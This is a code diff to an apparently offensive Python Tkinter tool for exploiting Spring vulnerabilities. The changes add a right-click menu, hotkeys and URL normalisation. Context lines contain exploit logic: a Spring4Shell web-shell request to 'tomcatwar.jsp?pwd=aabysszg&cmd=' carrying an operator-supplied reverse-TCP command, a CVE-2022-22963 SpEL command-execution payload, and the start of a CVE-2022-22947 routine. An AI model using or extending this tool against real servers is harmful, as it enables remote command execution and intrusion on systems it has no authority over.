@@ -126,7 +126,7 @@ class RootFrom:
         menu_kid.add_command(label='软件信息',command=self.software_info)
         menu_kid.add_command(label='Shell信息',command=self.shell_info)
         menu_kid.add_separator()
-        menu_kid.add_command(label='退出',command=self.Exit)
+        menu_kid.add_command(label='退出',command=self.Exit,accelerator='Esc')
         menu_info = tk.Menu(menu,tearoff=0)
         menu.add_cascade(label='清除',menu=menu_info)
         dir_clear = tk.Menu(menu,tearoff=0)
@@ -138,12 +138,72 @@ class RootFrom:
         dir_clear.add_command(label='漏洞地址',command=self.clear_dir4)
         dir_clear.add_command(label='ALL清除',command=self.clear_dirs)
         menu_info.add_cascade(label='日志清除',command=self.clearlog)
+        menu_info.add_cascade(label='urlout.txt',command=self.urloutTxt)
         menu_info.add_cascade(label='全局清除',command=self.clear)
         menu_get = tk.Menu(menu,tearoff=0)
         menu.add_cascade(label='更多',menu=menu_get)
         menu_get.add_command(label='利用姿势',command=self.vule_info)
         menu_get.add_command(label='FafaViewer',command=self.fofa_viewer)
         menu_get.add_command(label='MoreVules',command=self.more_vules)
+        def Menu_Right(event):
+            global right
+            menu_right.post(event.x_root,event.y_root)
+        def Scan_Right(event=None):
+            self.scan()
+        def Vule_Right(event=None):
+            self.vule()
+        def Dump_Right(event=None):
+            self.dumpinfo()
+        def Log_Right(event=None):
+            self.clearlog()
+        def Menu_Esc(event=None):
+            self.Exit()
+        def urlout_Right(event=None):
+            self.urloutTxt()
+        def Shell_Right(event=None):
+            self.shell_info()
+        #右键菜单设置
+        menu_right = tk.Menu(self.root,tearoff=False)
+        right = self.root
+        menu_right.add_command(label='软件信息',command=self.software_info)
+        menu_right.add_separator()
+        menu_right.add_command(label='泄露扫描',command=self.scan,accelerator='Ctrl+Q')
+        menu_right.add_command(label='漏扫利用',command=self.vule,accelerator='Ctrl+R')
+        menu_right.add_command(label='泄露下载',command=self.dumpinfo,accelerator='Ctrl+D')
+        menu_right.add_separator()
+        right_clear = tk.Menu(menu_right,tearoff=0)
+        menu_right.add_cascade(label='路径清除',menu=right_clear)
+        right_clear.add_command(label='URLs',command=self.clear_dir1)
+        right_clear.add_command(label='自动代理',command=self.clear_dir2)
+        right_clear.add_command(label='泄露字典',command=self.clear_dir3)
+        right_clear.add_command(label='泄露下载',command=self.clear_dir5)
+        right_clear.add_command(label='漏洞地址',command=self.clear_dir4)
+        right_clear.add_command(label='ALL清除',command=self.clear_dirs)
+        menu_right.add_command(label='日志清除',command=self.clearlog,accelerator='Ctrl+F')
+        menu_right.add_command(label='urlout',command=self.urloutTxt,accelerator='Ctrl+U')
+        menu_right.add_separator()
+        menu_right.add_command(label='Shell信息',command=self.shell_info,accelerator='Ctrl+P')
+        menu_right.add_separator()
+        right_more = tk.Menu(menu_right,tearoff=0)
+        menu_right.add_cascade(label='更多',menu=right_more)
+        right_more.add_command(label='利用姿势',command=self.vule_info)
+        right_more.add_command(label='FafaViewer',command=self.fofa_viewer)
+        right_more.add_command(label='MoreVules',command=self.more_vules)
+        self.root.bind("<Control-q>",Scan_Right)
+        self.root.bind("<Control-Q>",Scan_Right)
+        self.root.bind("<Control-r>",Vule_Right)
+        self.root.bind("<Control-R>",Vule_Right)
+        self.root.bind("<Control-d>",Dump_Right)
+        self.root.bind("<Control-D>",Dump_Right)
+        self.root.bind("<Control-f>",Log_Right)
+        self.root.bind("<Control-F>",Log_Right)
+        self.root.bind("<Control-p>",Shell_Right)
+        self.root.bind("<Control-P>",Shell_Right)
+        self.root.bind("<Control-u>",urlout_Right)
+        self.root.bind("<Control-U>",urlout_Right)
+        self.root.bind("<Escape>",Menu_Esc)
+        self.root.bind("<Escape>",Menu_Esc)
+        self.root.bind("<Button-3>",Menu_Right)
         self.root.config(menu=menu)
         self.root.mainloop()
     def Exit(self):
@@ -280,6 +340,10 @@ class RootFrom:
         if os.path.exists("vuleExecLogs.log"):
             os.remove("vuleExecLogs.log")
         messagebox.showinfo("日志清除","清理完成！")
+    def urloutTxt(self):
+        if os.path.exists("urlout.txt"):
+            os.remove("urlout.txt")
+        messagebox.showinfo("urlout","清理完成！")
     def uas(self):
         if self.User_Agent.get() == "Random":
             ua_nums = len(user_agent) - 1
@@ -613,6 +677,12 @@ class RootFrom:
             title = "================CVE_2022_2296命令执行================"
             self.info_text.insert(tk.INSERT,title)
             self.info_text.insert(tk.INSERT, '\n')
+            if ('://' not in url):
+                    url = str("http://") + str(url)
+            if str(url[-1]) != "/":
+                url = url + "/"
+            else:
+                url = url
             tar = '[+]target ' + url
             self.info_text.insert(tk.INSERT,tar)
             self.info_text.insert(tk.INSERT, '\n')
@@ -620,8 +690,6 @@ class RootFrom:
                 with open("vuleExecLogs.log","a") as f:
                     f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()) + " start")
                     f.write("\n")
-            if url[-1] != '/':
-                url += '/'
             cmd = self.reverse_tcp.get()
             url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(cmd)
             try:
@@ -647,6 +715,9 @@ class RootFrom:
     def CVE_2022_22963(self, url, proxies):
         title = "================开始对目标URL进行CVE-2022-22963漏洞利用================"
         self.info_text.insert(tk.INSERT,title)
+        self.info_text.insert(tk.INSERT, '\n')
+        tar = '[+]target ' + url
+        self.info_text.insert(tk.INSERT,tar)
         self.info_text.insert(tk.INSERT, '\n')
         payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'
         ua = self.uas()
@@ -699,6 +770,9 @@ class RootFrom:
     def CVE_2022_22947(self, url, proxies):
         title = "================开始对目标URL进行CVE-2022-22947漏洞利用================"
         self.info_text.insert(tk.INSERT,title)
+        self.info_text.insert(tk.INSERT, '\n')
+        tar = '[+]target ' + url
+        self.info_text.insert(tk.INSERT,tar)
         self.info_text.insert(tk.INSERT, '\n')
         ua = self.uas()
         headers1 = {
